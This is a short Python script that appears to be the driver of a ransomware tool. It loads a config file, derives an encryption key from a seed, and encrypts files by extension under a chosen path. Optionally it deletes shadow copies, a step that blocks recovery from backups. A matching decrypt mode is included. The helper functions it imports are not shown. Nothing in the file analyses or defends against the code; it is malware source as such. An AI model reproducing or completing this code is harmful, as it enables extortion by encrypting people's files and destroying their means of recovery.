#!/usr/bin/python3
import json
from Crypto.Hash import SHA256
from src import *

config_file = json.load(open('config.json'))
path = getPath(config_file['isDemo'])
print(path)
file_extensions = config_file['file_extensions']
exclusions = config_file['path_exclusions']
password = SHA256.new(config_file['seed'].encode('utf-8')).digest()

type(file_extensions)

if (config_file["mode"] == "encrypt"):
    print("encrypting...")
    encrypt(path, password, file_extensions, exclusions)
    print("encrypt done")
    
    if (config_file["deleteShadows"] == "True"):
        print("deleting shadow")
        delete_shadow()
        print("shadow deleted")

elif (config_file["mode"] == "decrypt"):
    print("decrypting...")
    decrypt(path, password, exclusions)
    print("decrypt done")
